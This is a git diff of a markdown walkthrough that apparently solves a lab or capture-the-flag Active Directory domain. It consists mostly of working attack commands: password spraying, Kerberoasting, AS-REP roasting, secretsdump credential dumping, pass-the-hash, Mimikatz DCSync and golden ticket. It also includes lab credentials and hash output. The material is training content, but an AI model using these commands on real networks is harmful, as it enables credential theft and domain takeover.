@@ -1,28 +1,50 @@
-# Domain
+# Active Directory Attack
 
-## Scan Domain Controller's Open Ports
+## Nmap Reconnaissance
+
+Scan Domain Controller's open ports.
+
 `nmap -Pn 172.140.0.40`
+
+- Add DNS Server as the Domain Controller machine.
+- Map the Domain Controller's IP to the `dc01.xyz.com` domain.
+
+```sh
+echo "172.140.0.40 dc01.xyz.com" >> /etc/hosts
+echo -e "nameserver 172.140.0.40\noptions ndots:0\nnameserver 8.8.8.8" > /etc/resolv.conf
+```
+
+> 172.140.0.40 is the IP address of the Domain Controller in this example.
 
 ## Password Brute-Forcing
 
+Create a `users.txt` file with some commonly known AD user nicknames. Try to fetch some AD users with *CrackMapExec*.
+
 ```sh
-crackmapexec smb targets.txt -u users.txt -p passwords.txt --continue-on-success
-crackmapexec smb targets.txt -u users.txt -p passwords.txt --continue-on-success | grep '[+]'
+crackmapexec ldap dc01.xyz.com -u users.txt -p '' -k
 ```
 
-## Check Login
-`crackmapexec smb targets.txt -u user -p pass`
+Now, maybe we can create a `passwords.txt` file with some `rockyou.txt` passwords.
 
-## Check Password Policy
-`crackmapexec smb targets.txt -u user -p pass --pass-pol`
+```sh
+crackmapexec ldap dc01.xyz.com -u users.txt -p passwords.txt --continue-on-success | grep '[+]'
+```
 
-## Enumerate Users
-`crackmapexec smb targets.txt -u user -p pass --users`
+If we are lucky enough, we will get a match. We can test a successful login with:
 
-## Enumerate Computers
-`crackmapexec smb targets.txt -u user -p pass --computers`
+```sh
+crackmapexec smb dc01.xyz.com -u USERNAME -p PASSWORD
+```
 
-## Install Bloodhound
+To this commands we can append several flags:
+- `--pass-pol` to view the AD password policy.
+- `--users` to view the AD users.
+- `--groups` to view the AD groups.
+- `--computers` to view the AD computers.
+
+## Bloodhound
+
+### Install Bloodhound
 
 ```sh
 echo "deb http://httpredir.debian.org/debian stretch-backports main" | sudo tee -a /etc/apt/sources.list.d/stretch-backports.list
@@ -56,37 +78,26 @@ chmod +x BloodHound-linux-x64/BloodHound
 ./BloodHound-linux-x64/BloodHound --no-sandbox &
 ```
 
-> Access localhost:7474 -> neo4j/neo4j
+> Access http://localhost:7474, credentials are: neo4j/neo4j
+
+Install Bloodhound:
 
 ```sh
 pip install bloodhound
-
-echo "172.140.0.40 dc01.xyz.com" >> /etc/hosts
-echo -e "nameserver 172.140.0.40\noptions ndots:0\nnameserver 8.8.8.8" > /etc/resolv.conf
 ```
 > Access http://localhost:7474
 
-`bloodhound-python -u lterry -p brianna -dc dc01.xyz.com -d xyz.com`
+`bloodhound-python -u USERNAME -p PASSWORD -dc dc01.xyz.com -d xyz.com -c all`
 
-## Change Collection Method (More information)
-`bloodhound-python -u rbond -p booboo -dc dc01.xyz.com -d xyz.com -c all`
+Steps:
 
-- Login into bloodhound
-- Upload data from previous collection
-- Explore it
+- Login into bloodhound.
+- Upload data from previous collection with `bloodhound-python`.
+- Explore the tool!
 
 # Impacket
 
-```sh
-crackmapexec smb 172.140.0.0/24
-crackmapexec winrm 172.140.0.0/24
-
-crackmapexec winrm targets.txt -u users.txt -p passwords.txt --continue-on-success -d xyz.com | grep '[+]'
-```
-
 ## Get a Shell on that User (Local Admin Account)
-
-`impacket-wmiexec xyz.com/Administrator:completeSecurePassw0rd@172.140.0.40 -debug`
 
 As we have a middle man which is the container, we need to change a little bit the logic of Impacket's python script:
 Ref: https://github.com/fortra/impacket/issues/272
@@ -102,12 +113,14 @@ if stringBinding is None:
 dcomInterface = transport.DCERPCTransportFactory(stringBinding)
 ```
 
-`impacket-wmiexec xyz.com/user:password@172.140.0.40 -debug`
+This command is only valid for the local admin account, due to the higher privilege level.
+
+`impacket-wmiexec xyz.com/USERNAME:PASSWORD@dc01.xyz.com -debug`
 
 - Check privileges: `whoami /priv`
 
-Try `impacket-smbclient` for file shares:
-`impacket-smbclient xyz.com/Administrator:completeSecurePassw0rd@172.140.0.40`
+Try `impacket-smbclient` for file shares with
+`impacket-smbclient xyz.com/USERNAME:PASSWORD@dc01.xyz.com`:
 
 ```
 > shares
@@ -117,36 +130,18 @@ Try `impacket-smbclient` for file shares:
 
 *Running this for an unprivileged user doesn't grant us access to that share.*
 
-Try for rdp as well impacket-psexec, etc:
+Try for RDP as well as impacket-psexec:
 
-`impacket-rdp_check xyz.com/rbond:booboo@172.140.0.40`
+`impacket-rdp_check xyz.com/USERNAME:PASSWORD@dc01.xyz.com`
 
-impacket-psexec doesn't give us any results, maybe because malicious code execution is flagged by Windows:
+`impacket-psexec` doesn't give us any results because malicious code execution is flagged by Windows.
+
 > Ref: https://www.trustedsec.com/blog/no_psexec_needed/
 
-----------------------------------------------------------------------------------------------------------
+# AS-REP Roasting
+## Kerberos Brute-Force (save TGTs)
 
-### Enumerate AD Objects
-
-`crackmapexec smb 172.140.0.40 -u rbond -p booboo -d xyz.com --rid-brute`
-
-### Brute-forcing Passwords of ServiceAccounts (Only one Kerberoastable)
-
-```sh
-crackmapexec smb 172.140.0.40 -u http_svc$ -p passwords.txt
-crackmapexec smb 172.140.0.40 -u mssql_svc$ -p passwords.txt
-crackmapexec smb 172.140.0.40 -u exchange_svc$ -p passwords.txt
-```
-
-http_svc$:scooby
-
-> Refs: https://www.tarlogic.com/blog/how-to-attack-kerberos/
-
-# Kerberos Brute-Force (save TGTs)
-
-The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets is encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline.
-
-- Install kerbrute:
+- Install `kerbrute`:
 
 ```
 git clone https://github.com/TarlogicSecurity/kerbrute
@@ -154,112 +149,119 @@ cd kerbrute
 pip install -r requirements.txt
 ```
 
-Run (where users.txt holds some User Accounts + Service Accounts):
+Run (where `users.txt` holds some User Accounts + Service Accounts) gives us matches between AD Users and passwords like *CrackMapExec* but it also warns for the fact that an account does not have pre-authentication enabled. It also saves TGT tickets for the targeted users in case a password is found.
 
 `python3 kerbrute.py -domain xyz.com -users users.txt -passwords passwords.txt -outputfile domain_passwords.txt`
 
-# AS-REP Roasting
+Using CME we can also find accounts with pre-authentication disabled:
 
-Using CME, we can find accounts with no Preauth using:
 
 `crackmapexec ldap 172.140.0.40 -u users.txt -p '' --asreproast out.txt`
 
-And crack the account password offline using:
-hashcat -m18200 out.txt passwords.txt
+We then crack the account's AS-REP message offline using:
+`hashcat -m18200 out.txt passwords.txt`
 
-Ref: https://wiki.porchetta.industries/ldap-protocol/asreproast
+> Ref: https://wiki.porchetta.industries/ldap-protocol/asreproast
 
 # Kerberoasting (Needs Domain Account)
 
-Fetch TGS tickets:
+At first, enumerate AD objects with:
 
-> users.txt contains: http_svc$ | mssql_svc$ | exchange_svc$
+`crackmapexec smb dc01.xyz.com -u USERNAME -p PASSWORD -d xyz.com --rid-brute`
 
-> Ref: getUsersSPNs.py from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
+### Brute-forcing Passwords of ServiceAccounts (Only one Kerberoastable)
 
-Run:
+With the information of the existing service accounts we can try to brute-force the service accounts but only one will be likely to succeed.
 
-`python getUserSPNs.py xyz.com/nmorgan:christ -usersfile users.txt -outputfile hashes.kerberoast`
+```sh
+crackmapexec smb dc01.xyz.com -u http_svc$ -p passwords.txt
+crackmapexec smb dc01.xyz.com -u mssql_svc$ -p passwords.txt
+crackmapexec smb dc01.xyz.com -u exchange_svc$ -p passwords.txt
+```
 
-- Crack TGS:
+> Refs: https://www.tarlogic.com/blog/how-to-attack-kerberos/
+
+
+A more elegant way consists on executing the Kerberoasting attack.
+
+We update the `users.txt` file with the service accounts:
+
+> `users.txt` now contains: http_svc$ | mssql_svc$ | exchange_svc$
+
+
+> Ref: getUserSPNs.py from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
+
+Using the `getUserSPNs.py` script from the above reference we fetch the TGS ticket from the vulnerable service account.
+
+`python getUserSPNs.py xyz.com/USERNAME:PASSWORD -usersfile users.txt -outputfile hashes.kerberoast`
+
+- Crack TGS ticket:
 
 `hashcat -m13100 --force -a 0 hashes.kerberoast passwords.txt`
 
-# Overpass The Hash/Pass The Key (PTK)
+### Pass The Ticket & Overpass The Hash (Intended Solution)
 
-## Drop NTLM Hashes (Requires Local Admin Account at least)
+## Drop NTLM Hashes & Others (Requires Local Admin Account at least)
 
-`impacket-secretsdump xyz.com/bavery:lalala@172.140.0.40`
+`impacket-secretsdump xyz.com/USERNAME:PASSWORD@dc01.xyz.com`
 
 ### Drop only NTLM hashes
 
-`impacket-secretsdump -just-dc-ntlm xyz.com/bavery:lalala@172.140.0.40`
+`impacket-secretsdump -just-dc-ntlm xyz.com/USERNAME:PASSWORD@dc01.xyz.com`
 
-- Grab Administrator account LMHASH:NTHASH hash
-- Get Administrator TGT
+- Grab Administrator account LMHASH:NTHASH hash.
+- Get Administrator TGT by running:
 
 ```sh
-impacket-getTGT xyz.com/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:4124f2ac13cbf884c4e0d592846485af
+impacket-getTGT xyz.com/Administrator -hashes LMHASH:NTHASH
 
-export KRB5CCNAME=/root/Desktop/Administrator.ccache
+export KRB5CCNAME=/Administrator.ccache
 
+# Obtain Remote Administrator Shell
 impacket-wmiexec xyz.com/Administrator@dc01.xyz.com -k -no-pass -debug
 
+# Obtain SMB Shell with Administrator Privileges
 impacket-smbclient xyz.com/Administrator@dc01.xyz.com -k -no-pass -debug
 ```
 
-# Pass The Ticket
+With each of them, the attacker can get to the *INTERNAL* share and get the secret flag.
 
-- Login as Local Admin in DC using Remote Desktop
-- Install Git
-- Disable Windows Defender to run Mimikatz (now we can run impacket-psexec: impacket-psexec xyz.com/Administrator@dc01.xyz.com -k -no-pass -debug)
-- Install PsExec (https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
-- Install Mimikatz
-	- `privilege::debug`
-	- `token::whoami`
-	- `token::elevate`
-	- `kerberos::list /export` (Exports tickets to current folder)
-	- `kerberos::ptt 0-40e10000-bavery@krbtgt~XYZ.COM-XYZ.COM.kirbi`
-	- `klist`
-	- `.\PsExec.exe -accepteula \\dc01.xyz.com cmd`
-	- Local Credentials (SAM): `lsadump::sam`
-	- Dump Domain Cache secrets (LSA): 
-		- `lsadump::lsa`
-		- `lsadump::lsa /inject /name:administrator`
-	- Tons of commands to be used: https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099
+> Ref: https://www.thehacker.recipes/ad/movement/kerberos/ptk
+
+# PsExec Unintended Solution
+
+From the local administrator, download and run the *PsExec* executable with:
+
+Download `PsExec` (https://learn.microsoft.com/en-us/sysinternals/downloads/psexec):
+
+- `.\PsExec64.exe -accepteula \\dc01 -s cmd`
+- `whoami` returns: `nt authority\system`
+- `cd ..\..\Users\Administrator`
+- `type flag.txt`
+
+> Ref: https://medium.com/tenable-techblog/psexec-local-privilege-escalation-2e8069adc9c8
 
 # Golden Ticket
 
 ## Grab NT Hashes 
 
-`impacket-secretsdump -just-dc-ntlm xyz.com/jhudson:angel1@172.140.0.40`
+`impacket-secretsdump -just-dc-ntlm xyz.com/USERNAME:PASSWORD@dc01.xyz.com`
 
 ## Get Domain SID
 
-`crackmapexec ldap dc01.xyz.com -u jhudson -p angel1 --get-sid`
+`crackmapexec ldap dc01.xyz.com -u USERNAME -p PASSWORD --get-sid`
 
-------------------------- Not Working -------------------------
 
-## Craft Ticket and run
+## Craft Golden Ticket For Administrator user
 
-```sh
-impacket-ticketer -nthash d5e3a0740ad179723a0e3ba300e637fe -domain-sid S-1-5-21-564955801-1803512963-3712075166 -domain xyz.com Administrator
 
-export KRB5CCNAME=~/Desktop/Administrator.ccache
+### DCSync Attack
 
-impacket-wmiexec xyz.com/Administrator@dc01.xyz.com -k -no-pass -debug
-impacket-smbclient xyz.com/Administrator@dc01.xyz.com -k -no-pass -debug
-```
-
-------------------------- Not Working -------------------------
-
-### DCSync
-
-Use mimikatz with replication account to perform DCSync attack and get NTLM hashes.
+Use *Mimikatz* with Replication Account to perform DCSync attack and get NTLM hashes.
 
 `lsadump::dcsync /domain:xyz.com /user:krbtgt`
 
-### Cont. Golden Ticket (Should be run within a Workstation)
+### Craft Golden Ticket (Should be run within a Workstation)
 
 ```
 kerberos::golden /domain:xyz.com /sid:S-1-5-21-2000547303-2172798533-1239318658 /user:Administrator /krbtgt:a4b2dbb473eef2b77dd1dec119cc5cd9 /id:500 /ptt
@@ -269,21 +271,11 @@ misc::cmd
 dir \\dc01\c$
 ```
 
-- Download PsExec
-
-`.\PsExec64.exe -accepteula \\dc01 -s cmd`
-
-whoami returns: nt authority\system
-
-`cd ..\..\Users\Administrator`
-
-`type flag.txt`
-
 > Ref: https://juggernaut-sec.com/domain-persistence-golden-ticket-and-silver-ticket-attacks/
 
-afisher:alejandro
 
-# NTDS file
+
+# EXTRA: Getting NTDS.dit file
 
 `crackmapexec smb 172.140.0.40 -u administrator -p completeSecurePassw0rd --ntds`
 
@@ -313,3 +305,7 @@ SMB         172.140.0.40    445    DC01             mssql_svc$:1121:aad3b435b514
 SMB         172.140.0.40    445    DC01             exchange_svc$:1122:aad3b435b51404eeaad3b435b51404ee:7467172e489f15ca013cc9ad03b97ae0:::
 SMB         172.140.0.40    445    DC01             [+] Dumped 20 NTDS hashes to /root/.cme/logs/DC01_172.140.0.40_2023-04-24_141454.ntds of which 16 were added to the database
 ```
+
+> Extra: Ref (**Abuse DNSAdmins**): https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/
+
+> Administrator AD Account Password is: `completeSecurePassw0rd`
